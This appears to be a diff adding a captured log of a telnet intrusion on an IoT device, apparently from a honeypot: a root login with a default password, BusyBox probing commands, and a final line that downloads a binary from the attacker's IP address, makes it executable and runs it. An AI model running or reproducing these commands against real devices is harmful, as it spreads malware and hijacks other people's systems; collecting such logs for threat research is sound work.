@@ -1,0 +1,12 @@
+from: 71.43.106.142:54707 user:root password:1111
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox CRWIV
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox CRWIV
+tftp; wget; /bin/busybox CRWIV
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox CRWIV
+rm .s; wget http://71.43.106.142:39681/.i; chmod 777 .i; ./.i; exit
+q
